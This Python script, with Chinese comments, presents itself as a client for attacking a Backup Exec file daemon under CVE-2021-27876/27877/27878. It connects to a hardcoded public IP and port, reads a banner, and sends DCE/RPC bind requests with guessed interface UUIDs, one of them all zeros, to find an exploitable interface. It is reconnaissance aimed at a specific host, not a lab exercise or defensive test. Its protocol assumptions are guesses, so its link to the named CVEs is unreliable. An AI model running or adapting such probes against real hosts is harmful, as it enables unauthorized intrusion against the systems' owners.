#!/usr/bin/env python3
"""
Backup Exec File Daemon RPC 客户端
基于 CVE-2021-27876/27877/27878 
"""

import socket
import struct
import hashlib
import os
import binascii

TARGET = "116.62.114.4"
PORT = 62831

# DCE/RPC 常量
RPC_VERSION_MAJOR = 5
RPC_VERSION_MINOR = 0

# 包类型
BIND = 11
BIND_ACK = 12
REQUEST = 0
RESPONSE = 2

# Backup Exec 相关接口 UUID (需要逆向分析)
# 常见的 Backup Exec File Daemon UUID
BEFD_UUIDS = [
    # CVE-2021-27876 接口
    b'\x44\xc7\x78\x7d\x8d\x4f\x1b\x4f\x8a\x86\x49\x62\xc3\x6a\xe4\x1e',  # 7d78c744-4f8d-4f1b-8a86-4962c36ae41e
    b'\x44\xc7\x78\x7d\x8d\x4f\x1b\x4f\x8a\x86\x49\x62\xc3\x6a\xe4\x1f',
    # 其他可能的 UUID
    b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',
]

def make_bind_pdu(interface_uuid, version_major=1, version_minor=0):
    """构造 DCE/RPC Bind PDU"""
    
    # 接口 UUID + 版本
    transfer_syntax = b'\x04\x5d\x88\x8a\xeb\x1c\xc9\x11\x9f\xe8\x08\x00\x2b\x10\x48\x60'  # NDR 语法
    transfer_version = struct.pack('<HH', 2, 0)
    
    # Context item
    ctx_item = struct.pack('<HBB', 0, 1, 0)  # context_id, num_transfer_syntaxes, reserved
    ctx_item += interface_uuid
    ctx_item += struct.pack('<HH', version_major, version_minor)  # interface version
    ctx_item += transfer_syntax + transfer_version
    
    # Bind body
    bind_body = struct.pack('<HH', 4096, 4096)  # max xmit/recv frag
    bind_body += struct.pack('<I', 0)  # assoc group
    bind_body += struct.pack('<BBH', 1, 0, 0)  # num_ctx_items, reserved
    bind_body += ctx_item
    
    # RPC Header
    frag_len = 24 + len(bind_body)  # header(24) + body
    header = struct.pack(
        '<BBBBIHHI',
        RPC_VERSION_MAJOR,  # version major
        RPC_VERSION_MINOR,  # version minor
        BIND,               # packet type
        0x03,               # flags (first+last frag)
        0x10,               # data rep (little endian, ASCII, IEEE)
        frag_len,           # frag length
        0,                  # auth length
        0                   # call id
    )
    
    return header + bind_body

def make_request_pdu(opnum, data, call_id=1):
    """构造 DCE/RPC Request PDU"""
    
    # Request header (alloc_hint, context_id, opnum)
    req_header = struct.pack('<IHH', len(data), 0, opnum)
    
    body = req_header + data
    
    # 对齐到 8 字节
    while len(body) % 8 != 0:
        body += b'\x00'
    
    frag_len = 24 + len(body)
    header = struct.pack(
        '<BBBBIHHI',
        RPC_VERSION_MAJOR,
        RPC_VERSION_MINOR,
        REQUEST,
        0x03,
        0x10,
        frag_len,
        0,
        call_id
    )
    
    return header + body

def recv_all(sock, timeout=10):
    """接收所有数据"""
    sock.settimeout(timeout)
    data = b""
    while True:
        try:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
            # 检查是否收到完整的 RPC 响应
            if len(data) >= 10:
                frag_len = struct.unpack('<H', data[8:10])[0]
                if len(data) >= frag_len:
                    break
        except socket.timeout:
            break
    return data

def parse_bind_ack(data):
    """解析 Bind ACK 响应"""
    if len(data) < 24:
        return False, "Response too short"
    
    version = data[0]
    ptype = data[2]
    
    if ptype != BIND_ACK:
        return False, f"Not a Bind ACK (type={ptype})"
    
    return True, "Bind successful"

def try_interface(sock, uuid_bytes, name="Unknown"):
    """尝试绑定到接口"""
    print(f"\n[*] Trying interface: {name}")
    print(f"    UUID bytes: {uuid_bytes.hex()}")
    
    bind_pdu = make_bind_pdu(uuid_bytes)
    sock.send(bind_pdu)
    
    resp = recv_all(sock, 5)
    if resp:
        print(f"    Response ({len(resp)} bytes): {resp[:50].hex()}")
        success, msg = parse_bind_ack(resp)
        print(f"    Result: {msg}")
        return success, resp
    else:
        print("    No response")
        return False, None

def explore_service():
    """探测 Backup Exec 服务"""
    print(f"[*] Connecting to {TARGET}:{PORT}")
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    sock.connect((TARGET, PORT))
    print("[+] Connected")
    
    # 首先检查是否有 banner
    sock.settimeout(2)
    try:
        banner = sock.recv(1024)
        print(f"[+] Banner: {banner.hex()}")
    except socket.timeout:
        print("[*] No banner received")
    
    sock.settimeout(10)
    
    # 尝试不同的 UUID
    for uuid_bytes in BEFD_UUIDS:
        success, resp = try_interface(sock, uuid_bytes)
        if success:
            print("[+] Found valid interface!")
            return sock
    
    # 如果预设的不行，尝试发送一些探测数据
    print("\n[*] Trying raw data probe...")
    
    # 发送 RPC bind 请求尝试枚举
    test_uuid = b'\x44\xc7\x78\x7d\x8d\x4f\x1b\x4f\x8a\x86\x49\x62\xc3\x6a\xe4\x1e'
    bind_pdu = make_bind_pdu(test_uuid)
    
    # 重新连接
    sock.close()
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    sock.connect((TARGET, PORT))
    
    print(f"[*] Sending bind request ({len(bind_pdu)} bytes)")
    print(f"    Data: {bind_pdu.hex()}")
    sock.send(bind_pdu)
    
    resp = recv_all(sock, 10)
    if resp:
        print(f"[+] Response ({len(resp)} bytes):")
        print(f"    Hex: {resp.hex()}")
        print(f"    ASCII: {resp}")
    else:
        print("[-] No response")
    
    return sock

if __name__ == "__main__":
    explore_service()
